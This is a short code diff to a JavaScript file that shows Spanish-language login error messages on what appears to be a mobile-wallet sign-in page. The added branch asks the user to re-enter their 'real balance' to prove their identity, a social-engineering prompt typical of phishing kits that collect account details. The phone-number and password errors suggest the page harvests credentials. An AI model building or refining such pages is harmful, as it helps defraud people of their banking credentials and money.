@@ -13,10 +13,12 @@ document.addEventListener('DOMContentLoaded', () => {
         errorDiv.id = 'error-message';
         
         if (errorType === 'user' || errorType === 'true') {
-            errorDiv.textContent = 'Numero de celular o clave incorrectos';
-        } else {
-            errorDiv.textContent = 'Error desconocido';
-        }
+              errorDiv.textContent = 'Numero de celular o clave incorrectos';
+            } else if (errorType === 'saldo') {
+              errorDiv.textContent = 'Saldo incorrecto, Por favor ingresa tu saldo real para validar que eres tu';
+            } else {
+              errorDiv.textContent = 'Error desconocido';
+            }
 
         document.body.prepend(errorDiv);
         
